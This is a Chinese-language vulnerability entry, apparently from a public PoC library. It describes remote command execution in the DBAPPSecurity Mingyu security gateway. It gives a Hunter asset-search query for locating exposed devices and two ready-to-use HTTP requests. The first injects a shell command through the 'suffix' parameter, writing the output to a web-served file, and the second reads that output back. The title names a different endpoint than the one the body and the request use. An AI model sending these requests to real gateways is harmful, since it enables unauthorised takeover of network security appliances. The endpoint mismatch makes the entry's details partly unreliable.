# 安恒明御安全网关aaa_portal_auth_config_reset存在远程命令执行漏洞

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ 特征


# 四、漏洞复现
```plain
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```plain
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggogol4vip7aq8zc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
